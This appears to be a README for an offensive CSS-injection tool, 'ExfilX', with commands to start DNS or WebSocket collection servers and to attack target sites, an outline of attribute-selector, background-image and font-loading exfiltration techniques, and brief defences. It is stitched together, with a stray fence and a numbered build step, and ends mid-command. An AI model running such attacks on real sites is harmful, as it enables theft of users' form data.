# ExfilX: CSS Injection Data Exfiltration Tool

ExfilX is a tool designed to test for CSS-based data exfiltration vulnerabilities in web applications. It demonstrates how malicious CSS can be used to extract sensitive data from vulnerable web pages using DNS or WebSocket techniques.

## ⚠️ Warning

This tool is for **educational and security testing purposes only**. Only use it on systems you own or have explicit permission to test. Unauthorized use of this tool may violate computer crime laws.

## Features

- Tests for CSS-based exfiltration vulnerabilities
- Injects malicious CSS to extract sensitive data from vulnerable web pages
- Supports multiple exfiltration methods:
  - DNS-based exfiltration
  - WebSocket-based exfiltration
- Includes a server component to capture exfiltrated data

## Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/exfilx.git
cd exfilx

# Install dependencies
pip install -r requirements.txt
```

## Usage

### Starting the Exfiltration Server

To start a DNS exfiltration server:

```bash
python main.py --server --method dns --dns-port 53 --dns-domain exfil.local
```

To start a WebSocket exfiltration server:

```bash
python main.py --server --method websocket --ws-host 127.0.0.1 --ws-port 8765
```

### Testing a Target for CSS Injection

To test a target using DNS exfiltration:

```bash
python main.py --target http://example.com --method dns --dns-domain exfil.local
```

To test a target using WebSocket exfiltration:

```bash
python main.py --target http://example.com --method websocket --ws-host 127.0.0.1 --ws-port 8765
```

### Specifying an Injection Point

If you know where to inject the CSS:

```bash
python main.py --target http://example.com --inject-point style
```

## How It Works

1. **CSS Injection**: The tool injects malicious CSS into the target web page through various injection points.
2. **Data Extraction**: The injected CSS uses techniques like attribute selectors and background images to extract sensitive data.
3. **Exfiltration**: The data is sent to the attacker's server using DNS requests or WebSocket connections.
4. **Data Collection**: The server component captures and processes the exfiltrated data.

## CSS Exfiltration Techniques

ExfilX uses several CSS-based techniques to extract data:

- **Attribute Selectors**: Using CSS selectors like `input[value^="a"]` to test if an input's value starts with "a"
- **Background Images**: Using `background-image: url()` to make HTTP requests containing exfiltrated data
- **Font Loading**: Using `@font-face` and unicode-range to detect character presence

## Protection Measures

To protect against CSS-based data exfiltration:

- Implement proper Content Security Policy (CSP) headers
- Sanitize user input that could be reflected in CSS
- Use HTTP-only cookies for sensitive data
- Implement proper CSRF protection

## License

This project is licensed under the MIT License - see the LICENSE file for details.
```

## 12. Initialize the package directories

```python:__init__.py
# ExfilX main package
```

```python:exfiltration/__init__.py
# Exfiltration methods package
```

```python:payloads/__init__.py
# CSS payloads package
```

```python:server/__init__.py
# Server components package
```

```python:utils/__init__.py
# Utility functions package
```

## How to Use the Tool

1. First, start the exfiltration server to capture data:

```bash
sudo python main.py --server --method dns --dns-port 53 --dns-domain exfil.local
```

2. In another terminal, test a target website for CSS injection vulnerabilities:

```bash
python main.py --target http://example.com --method dns --dns-domain exfil.local
